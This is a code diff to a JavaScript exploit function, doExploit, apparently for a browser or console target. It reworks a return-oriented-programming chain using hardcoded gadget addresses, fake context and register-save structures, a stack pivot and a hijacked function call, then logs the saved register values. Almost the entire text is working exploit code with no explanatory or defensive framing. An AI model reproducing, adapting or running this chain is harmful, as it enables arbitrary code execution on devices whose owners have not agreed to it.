@@ -377,38 +377,50 @@ function doExploit(buf, stale, temp) {
 		for(var i = 0; i < 0x1000; ++i)
 			saved[i] = read4(fixed, i);
 
-		var context = malloc(0x200);
+		// Begin Gadgets
+		var gadg2 = mref(0x4967F0);
+		var gadg3 = mref(0x433EB4);
+		var gadg4 = mref(0x1A1C98);
+		var gadg5 = mref(0x3C2314);
+		var returngadg = mref(0x181E9C);
+
+		var savegadg = mref(0x4336B0);
+		// End Gadgets
+
+		var context_load_struct = malloc(0x200);
 		var block_struct_1 = malloc(0x200);
-		write8(context, fixed, 0);
-		write8(mref(0x4967F0), fixed, 2);
-		write8(mref(0x433EB4), fixed, 4);
-		write8(mref(0x4967F0), fixed, 0x18 >> 2);
+		var block_struct_2 = malloc(0x200);
+		var savearea = malloc(0x400);
+
+		write8(context_load_struct, fixed, 0x00 >> 2);
+		write8(gadg2, fixed, 0x08 >> 2);
+		write8(gadg3, fixed, 0x10 >> 2);
+		write8(gadg2, fixed, 0x18 >> 2);
 		write8(block_struct_1, fixed, 0x28 >> 2);
 
-		sp = add2(sp, -0x800);
-		write8(mref(0x1A1C98), context, 0x58 >> 2);
-		write8(sp, context, 0x68 >> 2);
+		sp = add2(sp, -0x8030);
+		write8(gadg4, context_load_struct, 0x58 >> 2);
+		write8(sp, context_load_struct, 0x68 >> 2);
+		write8(returngadg, context_load_struct, 0x158 >> 2);
+		write8(add2(sp, 0x8030), context_load_struct, 0x168 >> 2);
 
-		var regsaveblock = malloc(0x200);
-		write8(regsaveblock, block_struct_1, 0);
-		write8(mref(0x4336B0), block_struct_1, 0x10 >> 2);
+		write8(savearea, block_struct_1, 0x0 >> 2);
+		write8(gadg5, block_struct_1, 0x10 >> 2);
+		write8(gadg2, block_struct_1, 0x18 >> 2);
+		write8(block_struct_2, block_struct_1, 0x28 >> 2);
+		write8(savegadg, block_struct_1, 0x38 >> 2);
 
-		write8(mref(0x3A278C), sp, 0);
-		write8(mref(0x181E9C), sp, 0x10 >> 2);
-		write8(mref(0x582AE8), sp, 0x28 >> 2);
-		write8(add2(sp, 0x7F0), sp, 0x38 >> 2);
-		write8(mref(0x39DEC4), sp, 0x50 >> 2);
-		write8(mref(0x3A278C), sp, 0x58 >> 2);
-		write8(add2(sp, 0x7F8), sp, 0x68 >> 2);
-		write8(mref(0x582AE8), sp, 0x80 >> 2);
-		write8(add2(regsaveblock, 0xF0), sp, 0x90 >> 2);
-		write8(mref(0x39DEC4), sp, 0xA8 >> 2);
-		write8(mref(0x3A278C), sp, 0xB0 >> 2);
-		write8(regsaveblock, sp, 0xC0 >> 2);
-		write8(mref(0x433620), sp, 0xD8 >> 2);
+		write8(gadg4, sp, 0x28 >> 2);
+
+		sp = add2(sp, 0x30);
+
+		write8(add2(context_load_struct, 0x100), block_struct_2, 0x00 >> 2);
+		write8(gadg3, block_struct_2, 0x10 >> 2);
+
+		sp = add2(sp, 0x8000);
 
 		log('Assigned.  Jumping.');
-		func.apply(0x101);
+		var ret = func.apply(0x101);
 		log('Jumped back.');
 
 		write8(curptr, funcaddr, 8);
@@ -418,6 +430,13 @@ function doExploit(buf, stale, temp) {
 		for(var i = 0; i < 0x1000; ++i)
 			write4(saved[i], fixed, i);
 		log('Restored data page.');
+
+
+
+		if (read8(savearea, 0x30))
+		for (var i = 0; i <= 8 * 30; i += 8) {
+			log('X' + (i / 8).toString() + ': ' + paddr(read8(savearea, i >> 2)));
+		}
 	}
 
 	holyrop();
